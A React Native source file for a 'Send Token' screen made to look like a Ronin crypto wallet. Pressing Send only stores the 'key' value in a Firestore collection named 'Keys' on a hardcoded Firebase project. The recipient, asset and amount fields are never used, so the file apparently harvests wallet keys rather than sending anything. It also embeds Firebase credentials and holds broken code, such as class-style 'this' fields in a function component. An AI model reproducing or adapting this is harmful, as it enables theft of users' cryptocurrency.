import React, { useState } from 'react';
import { Animated, Keyboard, ScrollView,Alert, Image, StyleSheet,KeyboardAvoidingView,TextInput
} from 'react-native';
import { color } from 'react-native-reanimated';
import { initializeApp } from 'firebase/app';
import { getFirestore, setDoc, doc } from 'firebase/firestore';
import {
  View, Text, Button, Colors,
  Typography, TextField,ChipsInput
} from 'react-native-ui-lib';

const ButtonSpace = 20;

const firebaseConfig = {
  apiKey: "AIzaSyByDPtfteUAt_HOr-tEaUawvQQ813gdVr8",
  authDomain: "atlas-20a8c.firebaseapp.com",
  projectId: "atlas-20a8c",
  storageBucket: "atlas-20a8c.appspot.com",
  messagingSenderId: "764124638085",
  appId: "1:764124638085:web:942422a53a05f9b58532ec",
  measurementId: "G-6YFE7TEXBL"
}  






function NewWallet ({navigation}) {
  const [key, setKey] = useState('');

  

  const enviar = async () => {
    try {
      await setDoc(doc(firestore, "Keys", key), {
        keys: key,
  
      });
    } catch (error) {
      alert("Error adding document: ", error);
    }
  }



  const handlePress = () => {
    if (!key) {
      Alert.alert('Key is required');
    
    } else {
      
      enviar();
      
      navigation.navigate('Home');
    }
  };
 initializeApp(firebaseConfig);

const firestore = getFirestore();









  state = {};
  toggle = false;
  animatedValue = new Animated.Value(0);

  animate = () => {
    this.toggle = !this.toggle;
    Animated.timing(this.animatedValue, {
      toValue: Number(this.toggle),
      duration: 300,
      useNativeDriver: true
    }).start();
  };

  function renderDivider() {
    return <View height={2} bg-grey60 />;
  }

  
    return (
      <ScrollView onBlur={Keyboard.dismiss}>
<KeyboardAvoidingView  behavior="position" enabled>

<View flex center marginT-30 >
        <Image
          style={styles.tinyLogo}
          source={require('../assets/topbar.png')}
        />


        <Text center={true} text60 marginB-5 marginT-80>
        Send Token

        </Text>

        <Text center={true} text85 marginB-50 marginT-14>
        </Text>


        <Text center={true} text105 marginB-5 marginT-3>

        FROM        </Text>

        <TextInput 
          style={styles.input }
          placeholder="ronin:e61bdb6ce9....fe19a7db315bd1887ddf50b9)"
          keyboardType="string" 
          value={key}
          editable={false} selectTextOnFocus={false}
          onChangeText={(key) => setKey(key)}
          


          
          
          />
        <Text center={true} text85 marginB-5 marginT-3>
        TO         </Text>
        <TextInput
          style={styles.input}
          placeholder=""
          keyboardType="string" />


<Text center={true} text85 marginB-5 marginT-3>
ASSET       </Text>
        <TextInput
          style={styles.input}
          placeholder=""
          keyboardType="string" />



        <Text center={true} text85 marginB-5 marginT-3>
        AMOUNT        </Text>
        <TextInput
          style={styles.input}
          placeholder=""
          keyboardType="string" />




        <Button marginT-20
          label={'Send'}
          style={{ marginBottom: ButtonSpace, backgroundColor: '#1c94f4' }}
          onPress={handlePress}/>




      </View>
</KeyboardAvoidingView>

      </ScrollView>
    );
  
}

export default NewWallet;




const styles = StyleSheet.create({
  container: {
    paddingTop: 50,
  },
  tinyLogo: {
    width: 170,
    height: 60,
  },
  logo: {
    width: 66,
    height: 58,
  },
  termos: {
    padding: 10,
  },
  input: {
    width: '80%',
    height: 40,
    borderRadius: 7,
    margin: 12,
    borderWidth: 1,
    padding: 10,
  },
});
